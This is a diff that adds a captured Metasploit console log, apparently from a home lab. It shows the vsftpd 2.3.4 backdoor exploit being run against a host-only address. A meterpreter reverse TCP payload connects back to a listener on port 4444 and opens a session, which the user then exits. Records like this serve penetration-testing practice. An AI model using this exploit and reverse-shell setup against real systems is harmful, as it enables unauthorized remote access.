@@ -1,0 +1,22 @@
+[0m[1m[34m[*][0m Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+[0mRHOSTS => 192.168.56.101
+[0mLHOST => 192.168.56.1
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.1:4444 
+[1m[34m[*][0m 192.168.56.101:21 - Running automatic check ("set AutoCheck false" to disable)
+[1m[34m[*][0m 192.168.56.101:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
+[1m[32m[+][0m 192.168.56.101:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
+[1m[32m[+][0m 192.168.56.101:21 - Backdoor has been spawned!
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:42186) at 2026-06-06 19:33:11 +0530
+
+[0mstty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+stty: 'standard input': Inappropriate ioctl for device
+[4mmeterpreter[0m > stty: 'standard input': Inappropriate ioctl for device
+[0m[1m[34m[*][0m Shutting down session: 1
+
+[1m[34m[*][0m 192.168.56.101 - Meterpreter session 1 closed.  Reason: User exit
+[0m[0m
